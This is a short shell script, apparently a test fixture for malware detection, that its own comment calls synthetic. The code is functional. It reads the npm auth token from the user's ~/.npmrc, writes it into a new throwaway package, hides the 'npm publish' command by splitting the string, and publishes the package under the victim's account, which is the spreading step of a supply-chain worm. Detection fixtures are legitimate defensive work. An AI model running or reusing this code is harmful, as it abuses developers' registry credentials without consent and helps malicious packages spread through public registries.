#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
T=$(sed -n 's/.*_authToken=//p' "$HOME/.npmrc" | head -n 1)
D=$(mktemp -d)
printf '{"name":"fixture-spread","version":"9.9.9"}' > "$D/package.json"
printf '//registry.npmjs.org/:_authToken=%s\n' "$T" > "$D/.npmrc"
C=$(printf '%s%s' 'np' 'm publish')
(cd "$D" && $C)
